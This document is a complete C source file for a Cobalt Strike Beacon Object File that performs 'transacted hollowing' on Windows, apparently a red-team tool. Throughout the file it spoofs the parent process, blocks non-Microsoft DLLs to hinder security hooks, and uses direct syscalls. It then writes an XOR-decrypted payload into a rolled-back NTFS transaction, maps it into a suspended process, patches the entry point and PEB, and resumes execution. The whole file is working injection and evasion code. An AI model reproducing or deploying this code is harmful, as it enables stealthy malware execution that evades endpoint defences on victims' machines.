////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      TransactedHollowing BOF                                                                                       //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o TransactedHollowing.o -c TransactedHollowing.c -masm=intel                               //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include "helpers.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$InitializeProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$UpdateProcThreadAttribute(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI void WINAPI KERNEL32$DeleteProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetTempPathW(DWORD, LPWSTR);
DECLSPEC_IMPORT WINBASEAPI UINT WINAPI KERNEL32$GetTempFileNameW(LPCWSTR, LPCWSTR, UINT, LPWSTR);
DECLSPEC_IMPORT NTSYSAPI BOOL NTAPI NTDLL$RtlSetCurrentTransaction(HANDLE);
DECLSPEC_IMPORT NTSYSAPI NTSTATUS NTAPI NTDLL$NtRollbackTransaction(HANDLE, BOOLEAN);
DECLSPEC_IMPORT NTSYSAPI VOID NTAPI NTDLL$RtlInitUnicodeString(PUNICODE_STRING, PCWSTR);
DECLSPEC_IMPORT int MSVCRT$_stricmp(const char*, const char*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT wchar_t* MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT errno_t MSVCRT$wcscat_s(wchar_t*, rsize_t, const wchar_t*);
DECLSPEC_IMPORT errno_t MSVCRT$wcscpy_s(wchar_t*, rsize_t, const wchar_t*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
#define malloc MSVCRT$malloc

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                    PROC SPAWN                                                      //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

HANDLE GetParentHandle(char* parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(KERNEL32$Process32First(snapshot, &entry) == TRUE)
    {
        while(KERNEL32$Process32Next(snapshot, &entry) == TRUE)
        {
            if(MSVCRT$_stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if(hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION Spawn(char* procPath, HANDLE hParent)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;

    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));

    KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attributeSize);
    KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if(!KERNEL32$CreateProcessA(procPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not spawn process");
    }

    KERNEL32$DeleteProcThreadAttributeList(si.lpAttributeList);
    NtClose(hParent);
    hParent = NULL;

    return pi;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                       MAIN                                                         //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen) {
    if(8 != sizeof(void*))
    {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64 bit system");
        return;
    }

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    SIZE_T allocation_size;
    int payload_size;
    datap parser;

    BeaconDataParse(&parser, args, alen);

    char* parent = BeaconDataExtract(&parser, NULL);
    char* process = BeaconDataExtract(&parser, NULL);
    char* payload = BeaconDataExtract(&parser, &payload_size);

    if(payload_size == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Payload too small: %d", payload_size);
        return;
    }
    else
    {
        allocation_size = payload_size + 1;
    }

    payload = xordecrypt(payload, allocation_size);

    /*==================================*/
    /*               SPAWN              */
    /*==================================*/

    HANDLE hParent = GetParentHandle(parent);
    if(hParent == INVALID_HANDLE_VALUE)
        return;

    PROCESS_INFORMATION pi = Spawn(process, hParent);
    if(pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return;

    /*==================================*/
    /*       TRANSACTED HOLLOWING       */
    /*==================================*/

    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hTransaction = NULL;
    status = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, 0, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created transaction: %llx", status);
    if(!NT_SUCCESS(status)) {
        NtResumeThread(pi.hThread, NULL);
        return;
    }
    NTDLL$RtlSetCurrentTransaction(hTransaction);

    HANDLE hFileTransacted = NULL;
    OBJECT_ATTRIBUTES oat;
    UNICODE_STRING filename;
    IO_STATUS_BLOCK ioStatus1;

    MSVCRT$memset(&ioStatus1, 0, sizeof(IO_STATUS_BLOCK));

    //wchar_t dn[MAX_PATH];
    //wchar_t temp[MAX_PATH];
    wchar_t* dn = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH);
    wchar_t* temp = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH);
    KERNEL32$GetTempPathW(MAX_PATH, temp);
    KERNEL32$GetTempFileNameW(temp, L"TH", 0, dn);
    //wchar_t temp_path[MAX_PATH] = L"\\??\\";
    wchar_t* temp_path = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH);
    MSVCRT$wcscpy_s(temp_path, MAX_PATH, L"\\??\\");
    MSVCRT$wcscat_s((wchar_t*)temp_path, MAX_PATH, dn);
    NTDLL$RtlInitUnicodeString(&filename, temp_path);
    InitializeObjectAttributes(&oat, &filename, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFileTransacted, STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE | FILE_READ_DATA | FILE_READ_ATTRIBUTES, &oat, &ioStatus1, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created transacted file: %llx", status);
    if(!NT_SUCCESS(status)) {
        NtResumeThread(pi.hThread, NULL);
        return;
    }

    NTDLL$RtlSetCurrentTransaction(hTransaction);
    MSVCRT$memset(&ioStatus1, 0, sizeof(IO_STATUS_BLOCK));
    status = NtWriteFile(hFileTransacted, NULL, NULL, NULL, &ioStatus1, payload, allocation_size, NULL, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing payload: %llx", status);
    if(!NT_SUCCESS(status)) {
        NtResumeThread(pi.hThread, NULL);
        return;
    }

    HANDLE hSection = NULL;
    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFileTransacted);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created section: %llx", status);
    if(!NT_SUCCESS(status)) {
        NtResumeThread(pi.hThread, NULL);
        return;
    }

    NtClose(hFileTransacted);
    NTDLL$NtRollbackTransaction(hTransaction, TRUE);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Rolled back transaction");
    NtClose(hTransaction);

    //map section in process
    PVOID sectionBaseAddress = 0;
    SIZE_T viewSize = 0;

    status = NtMapViewOfSection(hSection, pi.hProcess, &sectionBaseAddress, 0, 0, 0, &viewSize, ViewShare, 0, PAGE_READONLY);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Mapped view: %llx", status);
    if (!NT_SUCCESS(status)) {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Image not mapped at base -> payload relocations required");
        }
        else {
            NtResumeThread(pi.hThread, NULL);
            return;
        }
    }

    NtClose(hSection);

    //redirect to payload
    //1. Calculate VA of payload's EntryPoint
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Performing offset calculations");
    PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS64 payloadNtHeaders64 = (PIMAGE_NT_HEADERS64)(payload + payloadDosHeader->e_lfanew);
    DWORD entrypoint = payloadNtHeaders64->OptionalHeader.AddressOfEntryPoint;
    ULONG64 entrypoint_va = (ULONG64)sectionBaseAddress + entrypoint;

    //2. Write the new EntryPoint into context of the remote process
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Overwriting remote entrypoint");
    CONTEXT context;
    MSVCRT$memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    status = NtGetContextThread(pi.hThread, &context);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Fetching remote context: %llx", status);
    if (!NT_SUCCESS(status)) {
        NtResumeThread(pi.hThread, NULL);
        return;
    }

    context.Rcx = entrypoint_va;
    status = NtSetContextThread(pi.hThread, &context);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting remote context: %llx", status);
    if (!NT_SUCCESS(status)) {
        NtResumeThread(pi.hThread, NULL);
        return;
    }

    //3. Get access to the remote PEB
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Updating remote PEB");
    MSVCRT$memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    status = NtGetContextThread(pi.hThread, &context);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Fetching remote context: %llx", status);
    ULONG64 remotePEBAddress = context.Rdx;

    //get offset to PEB's ImageBase field
    LPVOID remoteImageBase = (LPVOID)(remotePEBAddress + (sizeof(ULONG64) * 2));

    //4. Write the payload's ImageBase into remote process' PEB
    status = NtWriteVirtualMemory(pi.hProcess, remoteImageBase, &sectionBaseAddress, sizeof(ULONG64), NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing new ImageBase into remote PEB: %llx", status);
    if (!NT_SUCCESS(status)) {
        NtResumeThread(pi.hThread, NULL);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Resuming remote thread");
    //resume thread
    status = NtResumeThread(pi.hThread, NULL);

    //cleanup
    NtClose(pi.hThread);
    NtClose(pi.hProcess);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
    return;
}